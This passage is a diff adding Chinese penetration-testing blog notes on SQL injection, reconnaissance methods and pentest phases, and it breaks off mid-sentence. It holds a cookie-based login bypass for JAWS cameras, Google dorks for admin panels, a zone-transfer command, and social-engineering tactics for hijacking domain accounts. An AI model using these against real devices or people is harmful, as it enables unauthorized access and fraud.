title="二、SQL注入的产生条件"></a>二、SQL注入的产生条件</h3><p>1、程序中存在未过滤的用户输入：SQL注入攻击通常是利用程序中存在<strong>未对用户输入进行有效过滤和检查</strong>的漏洞来实现的。当程序接收到用户输入并将其作为SQL查询的一部分执行时，如果未对输入进行恰当的处理，攻击者就可以通过注入恶意的SQL代码来执行任意的数据库操作。</p><p>2、程序使用动态拼接SQL语句：如果程序使用动态拼接SQL语句的方式来生成SQL查询，而<strong>没有对其中的变量进行正确的转义和处理</strong>，那么就有可能导致SQL注入攻击。</p><p>3、程序权限过大：如果<strong>程序执行数据库操作的权限过大</strong>，那么攻击者就可以利用SQL注入漏洞来获取和修改数据库中的任意数据。</p><p>4、数据库错误消息泄露：如果程序在执行SQL查询时，将<strong>错误消息返回给了用户</strong>，而这些错误消息中包含了敏感的数据库信息，那么攻击者就可以利用这些信息来构造SQL注入攻击。（敏感信息泄露）</p><h5 id="寻找突破注入点："><a href="#寻找突破注入点：" class="headerlink" title="寻找突破注入点："></a>寻找突破注入点：</h5><p>1、寻找可以控制的传递给后端的参数 ，参数<strong>直接</strong>传递给数据库查询<br>（ $SQL &#x3D; “select * from ‘databse’ where id &#x3D; $id “）<br>错误语法验证：<br>（ $SQL &#x3D; “select * from ‘databse’ where id &#x3D; $id’ “）<br>报错，则可以判断该处存在SQL注入点。<br>给ID传值，可以控制的传递给后端的参数，没有任何过滤直接查询数据库，所以我们可以利用。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信息收集思路流程</title>
+      <link href="/2023/03/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
+      <url>/2023/03/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>进行渗透测试之前， 最重要的一步就是信息收集，在这个阶段，我们要尽可能地收集目标组织的信息。所谓“知己知彼，百战不殆”，我们越是了解测试目标，测试的工作就越容易。</p><h3 id="需要收集的信息内容"><a href="#需要收集的信息内容" class="headerlink" title="需要收集的信息内容"></a>需要收集的信息内容</h3><p>在划定了测试范围之后，就需要进入信息收集阶段。在这个阶段，渗透人员需要使用各种公开资源尽可能地获取测试目标的相关信息。他们搜集信息的互联网渠道主要有：论坛&#x2F;公告板&#x2F;新闻组&#x2F;媒体文章&#x2F;博客&#x2F;社交网络&#x2F;github&#x2F;其他商业或非商业性的网站。此外，他们也可以借助各种搜索引擎中获取相关数据，如谷歌、雅虎、MSN必应、百度等。收集的信息主要包括</p><p>（1）收集目标网站服务器信息：域名、子域名、CNAME、cdn、真实IP、系统类型、版本等；</p><p>（2）识别并收集目标网站指纹信息：CMS、中间件、网页编程语言等及其通用漏洞调查收集；</p><p>（3）扫描并收集目标网站目录结构：一些文件可以访问获得信息、后台管理页面位置、日志位置等；</p><p>（4）网站的敏感信息：</p><p>whois信息、姓名、备案、邮箱、电话反查（邮箱丢社工库，社工准备等）；<br>弱口令扫描、密码爆破等（如针对系统管理员、网站后台管理员、数据库管理员等）；<br>网站源码是否泄露等，如github源码。<br>（5）收集目标服务器主机端口信息：不同端口提供不同的攻击思路和方向；</p><p>（6）网络防护信息：网络边界设备或网络节点设备，如有没有防火墙，有没有IPS、IDS或WAF，网络行为管理，全流量分析。</p><p>收集的信息越多，渗透测试成功的概率越高。<br>在信息收集中，最主要的就是收集<strong>服务器的配置信息</strong>和<strong>网站的敏感信息</strong>，其中包括<strong>域名及子域名</strong>信息、目标<strong>网站系统</strong>、<strong>CMS指纹</strong>、目标网站<strong>真实IP</strong> 、<strong>开放的端口</strong>等。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集。</p><h2 id="1、收集域名信息"><a href="#1、收集域名信息" class="headerlink" title="1、收集域名信息"></a>1、收集域名信息</h2><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，注意关注该域名的注册商和注册人的联系方式（电话和邮箱）等信息。域名信息收集的常用方法有以下这几种。<br>（1）Whois查询；<br>（2）反查<br>（2）备案信息查询</p><h3 id="1-1-Whois查询"><a href="#1-1-Whois查询" class="headerlink" title="1.1 Whois查询"></a>1.1 Whois查询</h3><h4 id="Whois简介"><a href="#Whois简介" class="headerlink" title="Whois简介"></a>Whois简介</h4><p>Whois是一个标准的互联网协议， 可用于收集域名注册信息，注册的域名、IP地址等信息。简单来说， Whois就是一个用于查询域名是否己被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p><p>在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人往往就是管理员。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>（1）Kali系统：在Kali系统中， Whois 己经默认安装，只需输入要查询的域名即可，代码为whois+域名（一般域名不包含主机名，如·baidu.com）。注意，Kali系统需连接真实网络，能上网<br><code>whoid wooyaa.fun</code><br>（2）站长之家（<a href="https://whois.chinaz.com)/">https://whois.chinaz.com）</a><br>（3）阿里云查询（<a href="https://whois.aliyun.com/%EF%BC%89">https://whois.aliyun.com/）</a></p><h3 id="1-3-反查"><a href="#1-3-反查" class="headerlink" title="1.3 反查"></a>1.3 反查</h3><p>除了用whois查询以外，还可以进行反查<br>（1）邮箱反查：这个邮箱曾经注册过哪些域名。<br>（2）注册人反查：这个注册人曾经注册过哪些域名。<br>（3）电话反查：这个电话曾经注册过哪些域名。</p><p>2.3 备案信息查询<br>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p><p>（1）ICP备案查询网：<a href="https://www.beianx.cn/">https://www.beianx.cn/</a><br>（2）天眼查： http : &#x2F;&#x2F;<a href="http://www.tianyancha.como/">www.tianyancha.como</a></p><h2 id="2、搜集子域名信息"><a href="#2、搜集子域名信息" class="headerlink" title="2、搜集子域名信息"></a>2、搜集子域名信息</h2><p>子域名也就是二级域名， 是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的， 因为对于这种规模的目标， 一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正<br>的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？ 常用的方法有以下这几种。</p><h3 id="2-1-子域名查询网站"><a href="#2-1-子域名查询网站" class="headerlink" title="2.1 子域名查询网站"></a>2.1 子域名查询网站</h3><p>(1) 可以查询子域名的网站 <code>https://searchdns.netcraft.com/</code>，需要科学上网。在表单中直接提交域名即可，这种方法查询大型网站比较有优势。<br>(2) 直接查看网站的证书详细信息 点击URL头前面小锁，查看详情</p><h3 id="2-2-域传送漏洞"><a href="#2-2-域传送漏洞" class="headerlink" title="2.2 域传送漏洞"></a>2.2 域传送漏洞</h3><p>DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新系的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作之在网络里真的有备用域名DNS赋予其时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息（没有身份认证），所以说允许不受信任的因特网用户执行DNS区域传送操作是后果最为严重的错误配置之一。一般防御域传送漏洞的措施是指定从DNS服务器。</p><p>（1）可以使用dig工具来检测域传送漏洞，命令为dig axfr @DNS服务器 要查询的域名，例如：<code>dig axfr @192.168.1.1 vulhub.org</code>。通过域传送漏洞可以获取子域名信息及子域名对应的IP地址。<br>（2）可以用nslookup<br>（3）可以用nmap工具</p><h3 id="2-3-子域名检测工具"><a href="#2-3-子域名检测工具" class="headerlink" title="2.3 子域名检测工具"></a>2.3 子域名检测工具</h3><p>用于子域名检测的工具主要有Layer子域名挖掘机、K8 、wydomain , Sublist3r dnsmaper 、subDomainsBrute 、Maltego CE 、dnsrecon(kali自带)等。重点推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute 。</p><h4 id="2-3-1-Layer子域名挖掘机5-0下载及使用"><a href="#2-3-1-Layer子域名挖掘机5-0下载及使用" class="headerlink" title="2.3.1 Layer子域名挖掘机5.0下载及使用"></a>2.3.1 Layer子域名挖掘机5.0下载及使用</h4><p>（1）layer子域名挖掘机5.0下载百度云链接，提取码：121l。<br>（2）在windows系统双击exe文件即可使用。其中dic.txt为常用子域名字典，如www等。<br>（3）输入要扫描的域名开启扫描，扫描进度在左下角查看。<br>（4）鼠标右击列表可以导出域名，选择位置保存为txt文件，默认保存在软件所在文件夹下。</p><h4 id="2-3-2-subDomainsBrute下载及使用"><a href="#2-3-2-subDomainsBrute下载及使用" class="headerlink" title="2.3.2 subDomainsBrute下载及使用"></a>2.3.2 subDomainsBrute下载及使用</h4><p>subDomainsBrute下载：工具GIthub下载地址，在如下图处下载并解压。具体使用方法可详见《【信息收集】渗透测试信息收集的种类及方法》</p><h3 id="2-4-搜索引擎枚举"><a href="#2-4-搜索引擎枚举" class="headerlink" title="2.4 搜索引擎枚举"></a>2.4 搜索引擎枚举</h3><p>可以利用Google语法搜索子域名，例如使用site:baidu.com语法搜索百度旗下的子域名。</p><h3 id="2-5-第三方聚合应用枚举"><a href="#2-5-第三方聚合应用枚举" class="headerlink" title="2.5 第三方聚合应用枚举"></a>2.5 第三方聚合应用枚举</h3><p>很多第三方服务汇聚了大量DNS 数据集，可通过它们检索某个给定域名的子域名。只需在其搜索栏中输入域名，就可检索到相关的域名信息。<br>读者也可以利用DNSdumpster网站（<a href="https://dnsdumpster.com/%EF%BC%89%E3%80%81%E5%9C%A8%E7%BA%BFDNS%E4%BE%A6%E6%9F%A5%E5%92%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98%E5%87%BA%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%BD%9C%E8%97%8F%E7%9A%84%E5%A4%A7%E9%87%8F%E5%AD%90%E5%9F%9F%E3%80%82">https://dnsdumpster.com/）、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域。</a></p><h3 id="2-6-证书透明度公开曰志枚举"><a href="#2-6-证书透明度公开曰志枚举" class="headerlink" title="2.6 证书透明度公开曰志枚举"></a>2.6 证书透明度公开曰志枚举</h3><p>证书透明度（Certificate Transparency, CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。<br>（1）首推好用网站：<a href="https://crt.sh/">https://crt.sh</a><br>（2）次推好用网站：<a href="https://censys.io/">https://censys.io/</a><br>（3）其他网站：<a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></p><h2 id="3、DNS-To-IP"><a href="#3、DNS-To-IP" class="headerlink" title="3、DNS To IP"></a>3、DNS To IP</h2><p>通过DNS解析找到IP地址，主要有以下几种方法<br>（1）ping</p><blockquote><p>ping 域名<br>ping wooyaa.fun</p></blockquote><p>（2）nslookup<br>（3）dig工具<br>（4）dnsenum工具<br>（5）站长之家<br>站长之家官网首页 <a href="http://tool.chinaz.com/">http://tool.chinaz.com</a><br>站长之家DNS查询 <a href="http://tool.chinaz.com/dns/?type=1&host=&ip=">http://tool.chinaz.com/dns/?type=1&amp;host=&amp;ip=</a></p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p><strong>CDN技术概述</strong><br><strong>定义</strong>：CDN的全称是Content DeliveryNetwork，即内容分发网络。</p><p><strong>简介</strong>：CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p><strong>基本原理</strong>：CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。利用节点缓存技术，通过在网络各处放置节点服务器，构成了在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p><p>目的：是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><h2 id="4、敏感信息收集"><a href="#4、敏感信息收集" class="headerlink" title="4、敏感信息收集"></a>4、敏感信息收集</h2><h3 id="4-1-敏感信息类型"><a href="#4-1-敏感信息类型" class="headerlink" title="4.1 敏感信息类型"></a>4.1 敏感信息类型</h3><p>此处提到的敏感信息主要包括：数据库文件、SQL注入、配置信息（server及PHP版本等）、源代码泄露、未授权访问和robots.txt等。</p><h3 id="4-2-通过搜索引擎收集敏感信息"><a href="#4-2-通过搜索引擎收集敏感信息" class="headerlink" title="4.2 通过搜索引擎收集敏感信息"></a>4.2 通过搜索引擎收集敏感信息</h3><p>Google是世界上最强的搜索引擎之一，对一位渗透测试者而言，它可能是一款绝佳的黑客工具。我们可以通过构造特殊的关键字语法来搜索互联网上的相关敏感信息。下面列举了一些Google 的常用语法及其说明。(掌握）</p><p>我们尝试搜索一些学校网站的后台，语法为site:”edu.cn” intext:”后台管理”， 意思是搜索网页正文中含有“后台管理”并且域名后缀是edu.cn的网站，搜索结果如图所示。<br>搜索容易存在sql注入的页面，例如：<code>site:testfire.net inurl:login</code><br>搜索指定的文件类型，例如：filetype pdf<br>搜索phpinfo，例如：intext:“PHP Version”</p><h3 id="4-3-钟馗之眼zoomeye等"><a href="#4-3-钟馗之眼zoomeye等" class="headerlink" title="4.3 钟馗之眼zoomeye等"></a>4.3 钟馗之眼zoomeye等</h3><p>钟馗之眼zoomeye支持公网设备指纹检索和Web指纹检索。网址指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据等。钟馗之眼zoomeye网址为：https:<a href="http://www.zoomeye.org/%E3%80%82%E4%BB%A5%E4%B8%8B%E5%88%97%E4%B8%BE%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AF%AD%E6%B3%95%EF%BC%9A">www.zoomeye.org/。以下列举常用的几种语法：</a><br>（1）指定组件名称，指定版本。例如，app:”Microsoft IIS httpd” ver:”6.0”，表示搜索IIS6.0组件<br>（2）指定端口号、指定主机。例如，port:3389 OS:”windows”，表示搜索开启3389端口的windows主机</p><h3 id="4-4-shodan"><a href="#4-4-shodan" class="headerlink" title="4.4 shodan"></a>4.4 shodan</h3><p>shodan可以搜索联网设备，例如摄像头。网址为：<a href="https://www.shodan.io/">https://www.shodan.io</a></p><p>（1）搜索JAWS&#x2F;1.1摄像头。默认使用使用口令[admin&#x2F;空]，即可登录后台，查看摄像头。若无法登录，可绕过，在控制台输入以下JS代码，然后直接访问&#x2F;view2.html。即可绕过登录验证进入控制台</p><blockquote><p> document.cookie&#x3D;”dvr_camcnt&#x3D;4”;<br> document.cookie&#x3D;”dvr_usr&#x3D;admin”;<br> document.cookie&#x3D;”dvr_pwd&#x3D;123”;</p></blockquote><h3 id="4-5-通过BurpSuite收集敏感信息"><a href="#4-5-通过BurpSuite收集敏感信息" class="headerlink" title="4.5 通过BurpSuite收集敏感信息"></a>4.5 通过BurpSuite收集敏感信息</h3><p>通过BurpSuite工具同样可以获取一些服务器的信息，如运行的Server类型及版本、PHP的版本信息等。针对不同的Server ，可以利用不同的漏洞进行测试。</p><h3 id="4-6-其他"><a href="#4-6-其他" class="headerlink" title="4.6 其他"></a>4.6 其他</h3><p>除此之外，也可以尝试在GitHub 上寻找相关敏感信息，如数据库连接信息、邮箱密码、uc-key 、阿里的osskey，有时还可以找到泄露的源代码等。<br>读者可以通过乌云漏洞表查询历史漏洞信息。</p><h2 id="5、指纹信息收集"><a href="#5、指纹信息收集" class="headerlink" title="5、指纹信息收集"></a>5、指纹信息收集</h2><p>网站信息收集只要指收集指纹信息</p><h4 id="5-1-CMS及Web指纹识别的必要性"><a href="#5-1-CMS及Web指纹识别的必要性" class="headerlink" title="5.1 CMS及Web指纹识别的必要性"></a>5.1 CMS及Web指纹识别的必要性</h4><p>必要性：在渗透测试中，只有识别出相应的Web容器或者CMS ，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p><p>内容管理系统（content management system，CMS）：是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p><h4 id="5-2-netcraft-Extension插件"><a href="#5-2-netcraft-Extension插件" class="headerlink" title="5.2 netcraft Extension插件"></a>5.2 netcraft Extension插件</h4><p>采用netcraft扩展工具可以收集指纹信息，netcraft扩展工具的安装和使用方法如下：<br>（1）打开火狐浏览器，点击其菜单栏，单击附加组件（add-ons）按钮。</p><p>（2）在搜索框输入netcraft，进行搜索</p><p>（3）进入搜索页面后，单击Netcraft Extension工具</p><p>（4）选择Add to Firefox</p><p>（5）弹出对话框后，选择Add。</p><p>（6）之后勾选对话框，且选择Okay</p><p>（7）Netcraft Extension工具安装完成后，会在火狐浏览器的右上角显示下图所示的图标。</p><p>（8）当访问一个网站时，Netcraft Extension工具会显示该网站的相关信息。<br>（9）若想得到更详细的信息，可以点击site report，如下图，可以得到网站的IP地址、操作系统、服务器类型等信息。</p><h4 id="5-3-Wappalyzer插件"><a href="#5-3-Wappalyzer插件" class="headerlink" title="5.3 Wappalyzer插件"></a>5.3 Wappalyzer插件</h4><p>Wappalyzer插件的安装方法与Netcraft Extension一致.</p><h4 id="5-4-采用工具进行指纹识别"><a href="#5-4-采用工具进行指纹识别" class="headerlink" title="5.4 采用工具进行指纹识别"></a>5.4 采用工具进行指纹识别</h4><p>Web指纹识别代表工具有WhatWeb 、御剑Web 指纹识别、WebRobo 、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。<br>Whatweb是kali系统自带工具，可以搜索直接使用。</p><h4 id="5-5-采用网站查询指纹"><a href="#5-5-采用网站查询指纹" class="headerlink" title="5.5 采用网站查询指纹"></a>5.5 采用网站查询指纹</h4><p>BugScaner: <a href="http://whatweb.bugscaner.com/look/%E3%80%82">http://whatweb.bugscaner.com/look/。</a><br>云悉指纹：<a href="http://www.yunsee.cn/finger.html%E3%80%82">http://www.yunsee.cn/finger.html。</a><br>WhatWeb: <a href="https://whatweb.net/%E3%80%82">https://whatweb.net/。</a></p><h3 id="6、网站目录收集以及敏感文件"><a href="#6、网站目录收集以及敏感文件" class="headerlink" title="6、网站目录收集以及敏感文件"></a>6、网站目录收集以及敏感文件</h3><h4 id="6-1-目的及常见工具"><a href="#6-1-目的及常见工具" class="headerlink" title="6.1 目的及常见工具"></a>6.1 目的及常见工具</h4><p>目的：在渗透测试中，探测Web 目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理页面、文件上传界面， 甚至可能扫描出网站的源代码。</p><p>针对网站目录的扫描主要有：DirBuster 、御剑后台扫描珍藏版、wwwscan 、Spinder.py （轻量级快速单文件目录后台扫描）、Sensitivefilescan （轻量级快速单文件目录后台扫描）、Weakfilescan （轻量级快速单文件目录后台扫描）等工具。</p><h4 id="6-2-御剑后台扫描珍藏版"><a href="#6-2-御剑后台扫描珍藏版" class="headerlink" title="6.2 御剑后台扫描珍藏版"></a>6.2 御剑后台扫描珍藏版</h4><p>（1）扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程；<br>（2）集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描；<br>（3）默认探测200 (也就是扫描的网站真实存在的路径文件)。<br>（4）使用界面：</p><h4 id="6-3-DirBuster"><a href="#6-3-DirBuster" class="headerlink" title="6.3 DirBuster"></a>6.3 DirBuster</h4><p>简介：DirBuster是OWASP开发的一款基于Java编写的、专门用于探视Web服务器的目录和隐藏文件。因为是用Java编写的，所以需要在Java运行环境ORE ）下安装。该工具的界面是纯图形化的，用法相对简单。<br>（1）kali系统中自带了DirBuster工具，可以搜索找到该工具。</p><p>（2）点击运行后软件界面如下图。</p><p>（3）并按如下步骤进行设置，适当调整窗口大小，可以看到Start按钮。</p><p>在Target URL输入框中输入要扫描的网址，扫描时将请求方法设置为“Auto Switch”。<br>设置线程的数值，推荐在20-30之间。太大了容易引起系统死机。<br>选择字典类型，如果使用个人字典扫描，先选择“ List based brute force ”选项，再单击“ Browse ”选择字典，可以选择工具自带的字典，也可以选择自己的字典。可以点击List info查看软件自带字典的简介再做选择。<br>在Select starting options 中选择“ URL Fuzz ”方式进行扫描。设置fruzzing 时需要注意，在URL to fuzz里输入“&#x2F;{dir}”。这里的{dir}是一个变量，用来代表字典中的每一行。如果你扫描的目标是<a href="http://www.xxx.com/admin/">http://www.xxx.com/admin/</a> ，那么就要在URL to fuzz 里填写“&#x2F;admin&#x2F;{dir}”，意思是在“{dir}”的前后可以随意拼接你想要的目录或者后缀，例如输入“&#x2F;admin&#x2F;{dir}.php ”就表示扫描admin目录下的所有php文件。</p><h3 id="7、社会工程学"><a href="#7、社会工程学" class="headerlink" title="7、社会工程学"></a>7、社会工程学</h3><p>（1）社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一名员工的口中挖掘出本应该是秘密的信息。<br>（2）假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。<br>（3）通过进一步地应用社会工程学，假设现在己经收集了目标人物的邮箱、QQ 、电话号码、姓名，以及域名服务商， 也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。<br>（4）除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到己经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库。</p><hr><p>信息收集参考文章：<br>layer子域名挖掘机下载与使用教程：<a href="https://blog.csdn.net/m0_48108919/article/details/119106181">https://blog.csdn.net/m0_48108919/article/details/119106181</a><br>工具推荐|目标域名收集之subDomainsBrute:<br><a href="https://cloud.tencent.com/developer/article/1595057">https://cloud.tencent.com/developer/article/1595057</a><br>指纹识别工具whatweb：<br><a href="http://www.360doc.com/content/22/0118/20/11604731_1013839371.shtml">http://www.360doc.com/content/22/0118/20/11604731_1013839371.shtml</a><br>被动信息收集cdn识别：<br><a href="https://blog.csdn.net/wwl012345/article/details/100058807">https://blog.csdn.net/wwl012345/article/details/100058807</a><br>后台扫描工具-御剑：<br><a href="https://blog.csdn.net/hackzkaq/article/details/110053457">https://blog.csdn.net/hackzkaq/article/details/110053457</a><br>kali-目录扫描：<br><a href="https://blog.csdn.net/weixin_41489908/article/details/115434107">https://blog.csdn.net/weixin_41489908/article/details/115434107</a><br>信息收集种类方法:<br><a href="https://blog.csdn.net/Fighting_hawk/article/details/122767626">https://blog.csdn.net/Fighting_hawk/article/details/122767626</a><br>CDN参考资料：<a href="https://www.t00ls.net/articles-36160.html%E3%80%81https://www.91ri.org/6233.html%E3%80%81https://www.91ri.org/3563.html">https://www.t00ls.net/articles-36160.html、https://www.91ri.org/6233.html、https://www.91ri.org/3563.html</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>在Ubuntu上搭建ARL灯塔系统</title>
+      <link href="/2023/03/20/%E6%90%AD%E5%BB%BA%E7%81%AF%E5%A1%94/"/>
+      <url>/2023/03/20/%E6%90%AD%E5%BB%BA%E7%81%AF%E5%A1%94/</url>
+      
+        <content type="html"><![CDATA[<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信息收集</title>
+      <link href="/2023/03/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2023/03/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="渗透测试信息收集流程"><a href="#渗透测试信息收集流程" class="headerlink" title="渗透测试信息收集流程"></a>渗透测试信息收集流程</h1><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>（外围信息收集，非接触式信息收集）在划定了测试范围之后，就需要进入信息收集阶段。在这个阶段，渗透人员需要使用各种公开资源尽可能地获取测试目标的相关信息。他们搜集信息的互联网渠道主要有：<br>论坛&#x2F;公告板&#x2F;新闻组&#x2F;媒体文章&#x2F;博客&#x2F;社交网络&#x2F;github&#x2F;其他商业或非商业性的网站。<br>此外，他们也可以借助各种搜索引擎中获取相关数据，如谷歌、雅虎、MSN必应、百度等。收集的信息主要包括:</p><ul><li>DNS 服务器</li><li>路由关系</li><li>whois 数据库</li><li>电子邮件地址</li><li>电话号码</li><li>个人信息</li><li>用户账户</li></ul><p>收集的信息越多，渗透测试成功的概率越高。</p><h3 id="目标识别"><a href="#目标识别" class="headerlink" title="目标识别"></a>目标识别</h3><p>这个阶段的主要任务是识别目标的<strong>网络状态</strong>、<strong>操作系统</strong>和<strong>网络架构</strong>。该阶段工作旨在<strong>完整地展现</strong>目标网络里各种<strong>联网设备或技术的完整关系</strong>，以帮助测试人员在接下来的工作里枚举目标网络的各种服务。简单来说就是测试哪些主机在线，那些主机的IP地址是什么？被测单位的网络架构是什么？网络节点设备的牌子等。</p><h3 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h3><p>这一阶段会根据前面各个阶段的成果，进一步<strong>找出</strong>目标系统中所有<strong>开放的端口</strong>。一旦找到了所有开放的端口，就可以通过这些端口来列出目标系统上运行的服务。主机上开放的端口都有相应的服务程序，对这些信息进行深度分析之后，可进一步发掘目标网络基础设施中可能存在的漏洞。即<strong>端口扫描</strong>，收集的主要信息如下：</p><ul><li>开放了哪些端口</li><li>端口上运行的服务以及详细版本</li><li>技术架构</li><li>Web 容器</li><li>开发语言以及框架</li><li>前后端分离</li></ul><h3 id="漏洞映射"><a href="#漏洞映射" class="headerlink" title="漏洞映射"></a>漏洞映射</h3><p>可以根据已经发现的开放端口和服务程序，<strong>查找、分析目标系统中存在的漏洞</strong>。如果能够采用自动和手动这两种不同的测试方法结合起来，审计人员对目标系统的认知就会更为清晰、透彻，并能够仔细地检查任何已知和未知的漏洞。即<strong>漏洞扫描、漏洞挖掘</strong>。</p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>如果目标网络没有直接的入口，欺骗的艺术 将起到抛砖引玉的重要作用。对目标组织中的人员进行<strong>定向攻击</strong>，很有可能帮助我们找到渗透目标系统的入口。例如，<strong>诱使用户运行安装存在后门的恶意程序</strong>，就可能为审计人员的渗透工作形成突破。社会工程学渗透分为多种不同实现形式。</p><ul><li>伪装成网络管理员，通过电话要求用户提供自己的账户信息；</li><li>发送钓鱼邮件来劫持用户的银行账户；</li><li>诱使某人出现在某个地点。</li></ul><p>在社会工程学中，达成同一既定目标的实现方式应有尽有。需要注意的是，在对目标实施欺骗以达成渗透目标之前，多数情况下需要长时间研究目标人员的心理。另外，在开展这个阶段的工作之前，</p><h2 id="您需要研究国内的法律是否有关于社会工程学的相关条款。"><a href="#您需要研究国内的法律是否有关于社会工程学的相关条款。" class="headerlink" title="您需要研究国内的法律是否有关于社会工程学的相关条款。"></a><strong>您需要研究国内的法律是否有关于社会工程学的相关条款</strong>。</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在仔细检查和发现目标系统中的漏洞之后，就可以使用已有的漏洞利用程序对目标系统进行渗透。审计人员可以把客户端漏洞利用程序和社会工程学进行结合，进而控制目标系统。这个阶段的主要任务是<strong>控制目标系统</strong> 。这个流程可以分为三步，涉及<strong>攻击前</strong>、<strong>攻击</strong>、<strong>攻击后</strong>的相关行动。</p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>获取目标系统的控制权是渗透成功的标识 